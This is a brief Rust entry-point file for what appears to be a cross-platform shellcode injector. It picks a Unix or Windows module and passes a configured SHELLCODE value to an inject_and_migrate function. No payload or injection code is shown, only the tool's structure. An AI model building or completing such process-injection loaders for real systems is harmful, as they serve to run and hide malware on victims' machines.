// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(unix)]
mod unix_im;
#[cfg(unix)]
use unix_im::inject_and_migrate;

#[cfg(windows)]
extern crate windows;
#[cfg(windows)]
mod windows_im;
#[cfg(windows)]
use windows_im::inject_and_migrate;

fn main() {
    inject_and_migrate(config::SHELLCODE);
}